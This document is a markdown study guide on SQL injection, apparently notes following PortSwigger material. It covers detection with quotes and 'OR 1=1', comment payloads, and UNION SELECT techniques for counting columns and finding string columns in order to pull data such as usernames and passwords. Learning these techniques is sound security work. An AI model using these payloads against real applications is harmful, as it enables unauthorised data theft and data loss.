
## Detecting SQLi

- The single quote character `'` and look for errors or other anomalies.
- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.


## Retrieve Data, Subvert Application Logic

- Below are some examples of payloads. Whether they will work or not depends and not **GURANTEED**. We need to have an idea of the query made to the application's database based on which we need to make modifications of the below payloads.
### **PAYLOADS** :

```sql
--
-- '
' --
OR 1=1 --'
'+OR+1=1--  
'
/*
Warning: Take care when injecting the condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.

+ sign helps to produce spaces in HTTP/HTTPS requests.
*/
```


## Retrieve Data from Database Tables

- To retrieve data from other tables in the database we can use the `UNION` keyword to execute additional `SELECT` query and append those results to the original query to get more information.
### **Requirements** :

- Same number of columns need to be selected in `SELECT` statements to use `UNION`.
- The columns must have same datatype.
- The columns must have the same order. For example : `table1 -> col1=int col2=string then table2 col1=string col2=int will give error. order same, datatype same, position matters  so => table2 -> col2=string col1=int will be right`.


#### 1. Determine number of columns required

- **METHOD 1** :
	- Use the `ORDER BY` clause and increasing the number by `1` each time until we hit an error to understand the number of columns returned by the original query. The number where we hit the error subtract `-1` to get number of columns. For example : `error at 3 so total columns = 3 - 1 = 2`.
		
	- The number of columns you find here will determine the payload structure of the rest of the steps.

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- 

etc...
```


- **METHOD 2** :
	- Involves submitting a series of `UNION SELECT` payloads specifying a different number of null values. If returns no error then number of columns = number of NULLs. If returns error increase number of `NULL`s For example : `' UNION SELECT NULL, NULL--`
		
	- The number of columns you find here will determine the payload structure of the rest of the steps.

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL FROM DUAL-- 

etc...
/*
on oracle every select query requires FROM keyword with a valid table name
DUAL is an oracle inbuilt table present in the database
*/
```

#### 2.  Finding String Compatible Datatype/Column Datatype Order

- Finding string compatible datatype lets us understand which column is displaying string type data and the order of column in which the string datatype is displayed. Now the idea is if there is a **username** , **password** column we can insert it into this position and the data will be possibly displayed onscreen.
	
- If we get an error then we need to move `'a'` to the subsequent positions of `NULL` and recheck until we get no error. If we get no error and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data. That being said sometimes no error but output still might not be displayed.
	
- This way we can not only find whether there is a string compatible datatype in the original query but also find the order of datatypes in the columns.

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
' UNION SELECT 'a',NULL,NULL,NULL FROM DUAL-- 


etc...'
/*
' UNION SELECT 'a',NULL,NULL,NULL FROM DUAL 
on oracle every select query requires FROM keyword with a valid table name
DUAL is an oracle inbuilt table present in the database
*/
```


### **PAYLOADS :**

```sql
UNION SELECT <columns> FROM <table name>--
/*
the number of columns will vary based on what we find in the requirements phase
the order, number of columns everything depends on the requirement phase
so do it carefully to get better results over here.
*/
```


## Examining the Database

[SQLi CHEATSHEET PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

